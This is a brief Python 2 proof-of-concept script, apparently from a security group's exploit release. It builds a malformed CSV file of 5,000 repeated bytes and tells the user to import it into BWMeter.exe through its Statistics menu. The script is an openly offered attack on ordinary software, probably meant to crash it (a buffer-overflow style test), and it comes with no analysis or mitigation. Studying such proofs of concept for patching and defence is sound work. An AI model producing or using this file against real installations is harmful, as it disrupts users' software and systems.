#!/usr/bin/python
#
 
 
junk = "\x47\x47" * 2500
 
try:
    file = open('b0t.csv','w');
    file.write(junk);
    file.close();
    print "\n[*] gotgeek labs"
    print "[*] http://gotgeek.com.br\n"
    print "[+] b0t.csv created."
    print "[+] Open BWMeter.exe..."
    print "[+] Statistics >> Import"
    print "[+] and Select b0t.csv\n"
except:
    print "\n[-] Error.. Can't write file to system.\n"